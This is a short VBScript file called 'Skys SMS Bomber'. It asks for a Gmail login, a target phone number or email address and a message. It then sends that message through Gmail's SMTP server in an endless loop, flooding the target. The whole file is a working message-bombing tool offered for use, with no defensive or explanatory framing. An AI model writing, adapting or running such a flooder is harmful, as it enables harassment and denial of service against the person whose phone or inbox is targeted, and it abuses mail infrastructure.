Dim User
Dim Pass
Dim Name
Dim Input
Dim Input2
Dim Input3
X=MsgBox("Welcome To Skys SMS Bomber",0,"SMS Vbs")
User = InputBox("Enter your G-mail:")
Pass = InputBox("Enter Password:"& vbCrLf & ""& vbCrLf & "Please note passwords are NOT stored in this script and are case sensitive.")
Name = InputBox("Enter Name:")
Input = InputBox("Enter Phone Number/Email")
Input2 = InputBox("Enter title:")
Input3 = InputBox("Enter message:")
EmailSubject = (""& Input2)
EmailBody = (""& Input3)

'Const EmailFrom = ""
'Const EmailFromName = ""

Const SMTPServer = "smtp.gmail.com"
'Const SMTPLogon = ""
'Const SMTPPassword = ""
Const SMTPSSL = True
Const SMTPPort = 465

Const cdoSendUsingPickup = 1  'Send message using local SMTP service pickup directory.
Const cdoSendUsingPort = 2  'Send the message using SMTP over TCP/IP networking.

Const cdoAnonymous = 0  ' No authentication
Const cdoBasic = 1  ' BASIC clear text authentication
Const cdoNTLM = 2  ' NTLM, Microsoft proprietary authentication

' First, create the message

Set objMessage = CreateObject("CDO.Message")
objMessage.Subject = EmailSubject
objMessage.From = "<" & User & Name & ">"
objMessage.To = "<" & Input & ">"
objMessage.TextBody = EmailBody

' Second, configure the server

objMessage.Configuration.Fields.Item _
("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2

objMessage.Configuration.Fields.Item _
("http://schemas.microsoft.com/cdo/configuration/smtpserver") = SMTPServer

objMessage.Configuration.Fields.Item _
("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = cdoBasic

objMessage.Configuration.Fields.Item _
("http://schemas.microsoft.com/cdo/configuration/sendusername") = User

objMessage.Configuration.Fields.Item _
("http://schemas.microsoft.com/cdo/configuration/sendpassword") = Pass

objMessage.Configuration.Fields.Item _
("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = SMTPPort

objMessage.Configuration.Fields.Item _
("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = SMTPSSL

objMessage.Configuration.Fields.Item _
("http://schemas.microsoft.com/cdo/configuration/smtpconnectiontimeout") = 60

objMessage.Configuration.Fields.Update

do
objMessage.Send
loop
